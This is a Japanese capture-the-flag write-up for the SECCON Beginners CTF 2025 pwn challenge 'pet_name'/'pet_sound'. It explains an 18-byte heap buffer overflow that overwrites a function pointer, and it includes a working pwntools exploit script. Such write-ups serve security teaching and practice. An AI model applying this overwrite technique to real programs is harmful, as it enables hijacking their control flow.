# pet_name

100 Points / 586 Solves

## 調査

```sh
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b44722880e4bcdd32b041ab7cd46dea9a7e53a6e, for GNU/Linux 3.2.0, not stripped
```

```sh
$ checksec chall
[*] '/home/salt/ctf/writeup/2025/SECCON Beginners CTF 2025/pwn/pet_sound/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

- `read(0, pet_A->sound, 0x32);`があるが、soundに格納できる文字数は32文字のため、18文字分バッファオーバーフローができる

    ```c
    struct Pet {
        void (*speak)(struct Pet *p);
        char sound[32];
    };
    ```

- `speak_flag`関数のアドレスなどの情報が出力されているため、`pet_B->speak`で実行されるアドレスを上書きしてあげれば良い

## 実行

- [solve.py](./solve.py)

```py
#!/usr/bin/env python3
from pwn import *
import re

binary = './chall'
p = process(binary)
# p = remote('localhost', 9090)

p.recvuntil(b"'speak_flag' is at: ")
speak_flag_addr = int(p.recvline().strip(), 16)
print(speak_flag_addr)

p.recvuntil(b"Input a new cry for Pet A > ")
payload = b'A' * (32 + 8)
payload += p64(speak_flag_addr)
p.sendline(payload)
p.interactive()
```

```sh
./solve.py
```
